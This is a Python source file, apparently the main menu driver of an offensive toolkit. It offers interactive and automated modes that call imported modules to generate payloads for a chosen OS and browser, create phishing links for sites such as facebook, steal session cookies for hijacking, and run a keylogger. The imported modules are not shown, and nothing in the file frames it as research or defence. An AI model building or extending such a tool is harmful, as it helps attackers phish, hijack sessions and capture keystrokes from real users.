# merged_main.py
import payload_generator
import social_engineering
import session_hijacking
import keylogger
import database_logger
import threading
import time

def generate_payload_module():
    os_type = input("Enter target OS (e.g., Windows, Linux): ")
    browser = input("Enter target browser (e.g., Chrome, Firefox): ")
    payload = payload_generator.generate_payload(os_type, browser)
    print(f"Generated Payload: {payload}")
    database_logger.log_action("payload_generation", "success")
    return payload

def social_engineering_module():
    site_name = input("Enter the site name for phishing (e.g., facebook): ")
    phishing_link = social_engineering.generate_phishing_link(site_name)
    print(f"Generated Phishing Link: {phishing_link}")
    database_logger.log_action("social_engineering", "success")
    return phishing_link

def session_hijacking_module():
    session_id = input("Enter session ID to hijack: ")
    is_valid = session_hijacking.steal_cookie(session_id)
    result = "success" if is_valid else "failed"
    print(f"Session Hijacking Attempt: {result}")
    database_logger.log_action("session_hijacking", result)
    return is_valid

def keylogging_module():
    print("Starting keylogger. Press Ctrl+C to stop.")
    threading.Thread(target=keylogger.start_keylogger).start()

def automated_execution():
    # Sequentially execute each module without user input
    print("Running automated module execution...")

    payload = payload_generator.generate_payload("Windows", "Chrome")
    print(f"Automated Payload: {payload}")
    database_logger.log_action("automated_payload_generation", "success")

    phishing_link = social_engineering.generate_phishing_link("example_site")
    print(f"Automated Phishing Link: {phishing_link}")
    database_logger.log_action("automated_social_engineering", "success")

    session_id = "sample_session_id"
    is_valid = session_hijacking.steal_cookie(session_id)
    result = "success" if is_valid else "failed"
    print(f"Automated Session Hijacking Attempt: {result}")
    database_logger.log_action("automated_session_hijacking", result)

    print("Automated keylogger execution (run manually in separate thread if needed)")
    # Optionally, start keylogging here if appropriate for automation
    # threading.Thread(target=keylogger.start_keylogger).start()
    
    print("Automated execution completed.")

def display_menu():
    print("\nChoose an action:")
    print("1. Generate Payload")
    print("2. Launch Social Engineering Attack")
    print("3. Attempt Session Hijacking")
    print("4. Start Keylogging")
    print("5. Run Automated Full Suite")
    print("6. Exit")

def main():
    database_logger.create_database()  # Ensure the database is set up

    print("Welcome! Choose the mode:")
    print("1. Interactive Mode")
    print("2. Automated Mode")
    mode_choice = input("Enter choice (1-2): ")

    if mode_choice == "2":
        automated_execution()
    elif mode_choice == "1":
        # Interactive mode with menu-driven approach
        while True:
            display_menu()
            choice = input("Enter choice (1-6): ")

            if choice == "1":
                generate_payload_module()
            elif choice == "2":
                social_engineering_module()
            elif choice == "3":
                session_hijacking_module()
            elif choice == "4":
                keylogging_module()
            elif choice == "5":
                print("Switching to Automated Full Suite...")
                time.sleep(1)
                automated_execution()
            elif choice == "6":
                print("Exiting the program.")
                break
            else:
                print("Invalid choice. Please select from the menu.")
    else:
        print("Invalid mode. Exiting program.")

if __name__ == "__main__":
    main()
